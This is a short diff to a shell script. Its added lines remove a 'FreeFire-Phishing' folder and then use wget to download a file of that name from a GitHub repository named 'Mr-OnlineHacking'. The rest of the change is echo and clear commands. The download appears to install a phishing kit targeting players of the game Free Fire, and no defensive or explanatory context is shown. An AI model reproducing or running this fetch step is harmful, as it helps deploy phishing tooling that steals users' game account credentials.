@@ -2,7 +2,8 @@
 echo ""
 clear
 echo ""
-
+rm -rf FreeFire-Phishing
+wget -q --show-progress https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/FreeFire/SM/FreeFire-Phishing
 clear
 echo -e ""
 echo ""
